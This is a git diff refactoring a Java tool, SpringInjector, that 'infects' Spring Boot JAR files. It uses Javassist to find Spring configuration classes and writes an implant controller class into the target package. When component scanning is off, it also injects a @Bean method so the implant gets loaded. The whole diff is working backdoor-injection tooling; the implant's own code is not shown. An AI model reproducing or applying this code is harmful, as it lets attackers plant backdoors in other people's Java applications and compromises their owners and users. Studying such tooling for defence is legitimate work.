@@ -14,12 +14,22 @@ import java.util.*;
 import java.util.jar.JarEntry;
 
 public class SpringInjector {
+    private final Class<?> implantComponentClass;
+    private final Class<?> implantSpringConfigClass;
+
+
+    SpringInjector(Class<?> implantComponent, Class<?> implantSpringConfig) {
+        this.implantComponentClass = implantComponent;
+        this.implantSpringConfigClass = implantSpringConfig;
+    }
+
+    // TODO This CLI logic will be merged into the main Cli class
     public static void main(String[] args) {
         if (args.length < 2) {
             System.exit(1);
         }
 
-        SpringInjector injector = new SpringInjector();
+        SpringInjector injector = new SpringInjector(SpringImplantController.class, SpringImplantConfiguration.class);
         try {
             Path targetPath = Path.of(args[0]);
             Path outputPath = Path.of(args[1]);
@@ -43,9 +53,6 @@ public class SpringInjector {
         }
     }
 
-    SpringInjector() {
-    }
-
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
         boolean didInfect = false;
         boolean foundSignedClasses = false;
@@ -61,29 +68,14 @@ public class SpringInjector {
                     continue;
                 }
 
-                ClassFile currentlyProcessingClassFile;
+                ClassFile currentlyProcessing;
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
-                    currentlyProcessingClassFile = new ClassFile(in);
-                    if (!isSpringConfigurationClass(currentlyProcessingClassFile)) {
+                    currentlyProcessing = new ClassFile(in);
+                    if (!isSpringConfigurationClass(currentlyProcessing)) {
                         entry.passOn();
                         continue;
                     }
                     System.out.println("[+] Found Spring configuration: " + entry.getName());
-
-                    if (!hasComponentScanEnabled(currentlyProcessingClassFile)) {
-                        System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
-
-                        ClassFile implantSpringConfig = loadSpringImplantConfigClass();
-                        if (!addSpringBeanToConfigClass(currentlyProcessingClassFile, implantSpringConfig)) {
-                            System.out.println("[-] Class '" + currentlyProcessingClassFile.getName() + "' already infected. Skipping.");
-                            continue;
-                        }
-
-                        currentlyProcessingClassFile.write(entry.addOnly());
-                        System.out.println("[+] Injected @Bean method into '" + currentlyProcessingClassFile.getName() + "'.");
-                    } else {
-                        entry.passOn();
-                    }
 
                     /*
                      * By adding our own Spring component (like a RestController) into the JAR under the same package
@@ -91,13 +83,35 @@ public class SpringInjector {
                      * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
                      * component needs to be explicitly referenced as a @Bean in the config class.
                      */
-                    ClassFile implantClass = loadImplantClass();
-                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessingClassFile.getName());
-                    JarEntry newJarEntry = convertToJarEntry(implantClass, targetPackageName);
-                    implantClass.write(fiddler.addNewEntry(newJarEntry));
+                    ClassFile implantComponent = ImplantReader.findAndReadClassFile(implantComponentClass);
+                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
+                    String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
+                    implantComponent.setName(targetPackageName + "." + implantComponentClassName);
+                    JarEntry newJarEntry = convertToJarEntry(implantComponent);
+                    implantComponent.write(fiddler.addNewEntry(newJarEntry));
                     System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
 
+                    if (!hasComponentScanEnabled(currentlyProcessing)) {
+                        /*
+                         * Component Scanning seems to not be enabled for this Spring configuration.
+                         * Thus, it's necessary to add a @Bean annotated method returning an instance of the component.
+                         */
+                        System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
+
+                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
+                            System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
+                            continue;
+                        }
+
+                        currentlyProcessing.write(entry.addOnly());
+                        System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
+                    } else {
+                        entry.passOn();
+                    }
+
                     didInfect = true;
+                } catch (ClassNotFoundException e) {
+                    throw new RuntimeException(e);
                 }
             }
 
@@ -126,45 +140,32 @@ public class SpringInjector {
         return parts[parts.length - 1];
     }
 
-    private static ClassFile loadImplantClass() throws IOException {
-        try {
-            // TODO Add class translation hashmap thing as param here
-            return ImplantReader.findAndReadClassFile(SpringImplantController.class);
-        } catch (ClassNotFoundException e) {
-            throw new RuntimeException(e);
-        }
+    private static String convertToClassFormatFqcn(final String dotFormatClassName) {
+        return dotFormatClassName.replace(".", "/");
     }
 
-    private static ClassFile loadSpringImplantConfigClass() {
-        try {
-            return ImplantReader.findAndReadClassFile(SpringImplantConfiguration.class);
-        } catch (ClassNotFoundException | IOException e) {
-            throw new RuntimeException("Cannot load SpringImplantConfiguration class.", e);
-        }
-    }
+    private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
+        ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(implantSpringConfigClass);
+        String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
+        String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
+        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
+        String implantBeanMethodName = "getImplantController";  // TODO Find this one by it's @Bean annotation?
 
-    private static boolean addSpringBeanToConfigClass(ClassFile existingSpringConfig, final ClassFile implantSpringConfig) {
-        final String beanMethodName = "getImplantController";
-        MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(beanMethodName);
+        // TODO This entire method should just be a generalized "copy and merge everything X into Y".
+
+        MethodInfo existingImplantControllerBean = existingSpringConfig.getMethod(implantBeanMethodName);
         if (existingImplantControllerBean != null) {
             return false;
         }
 
         try {
-            String targetPackageDesc = parsePackageNameFromFqcn(existingSpringConfig.getName()).replace(".", "/");
-            String implantPackageDesc = parsePackageNameFromFqcn(implantSpringConfig.getName()).replace(".", "/");
-            String targetNameDesc = parseClassNameFromFqcn(existingSpringConfig.getName());
-            String implantNameDesc = parseClassNameFromFqcn(implantSpringConfig.getName());
-            // TODO Make a convertToClassFormatFqcn() to go from dot-notation to slash-notation
-
             Map<String, String> translateTable = new HashMap<>();
-            // TODO Don't hardcode
-            translateTable.put(implantPackageDesc + "/SpringImplantController", targetPackageDesc + "/SpringImplantController");
-            translateTable.put(implantPackageDesc + "/" + implantNameDesc, targetPackageDesc + "/" + targetNameDesc);
+            translateTable.put(implantPackageDesc + "/" + implantComponentClassName, targetPackageDesc + "/" + implantComponentClassName);
+            translateTable.put(convertToClassFormatFqcn(implantSpringConfig.getName()), convertToClassFormatFqcn(existingSpringConfig.getName()));
 
-            MethodInfo implantBeanMethod = implantSpringConfig.getMethod(beanMethodName);
+            MethodInfo implantBeanMethod = implantSpringConfig.getMethod(implantBeanMethodName);
             String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
-            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+            MethodInfo targetBeanMethod = new MethodInfo(existingSpringConfig.getConstPool(), implantBeanMethodName, implantBeanMethodDesc);
             targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
 
             CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(existingSpringConfig.getConstPool(), translateTable);
@@ -208,9 +209,7 @@ public class SpringInjector {
         target.addAttribute(targetAnnotationsAttr);
     }
 
-    private static JarEntry convertToJarEntry(final ClassFile classFile, final String targetPackageName) {
-        String implantClassName = parseClassNameFromFqcn(classFile.getName());
-        classFile.setName(targetPackageName + "." + implantClassName);
+    private static JarEntry convertToJarEntry(final ClassFile classFile) {
         // TODO Maybe this "BOOT-INF" etc is not a good thing to hardcode? Versioned JARs? Discrepancies in Spring JAR structure?
         String fullPathInsideJar = "BOOT-INF/classes/" + classFile.getName().replace(".", "/") + ".class";
         return new JarEntry(fullPathInsideJar);
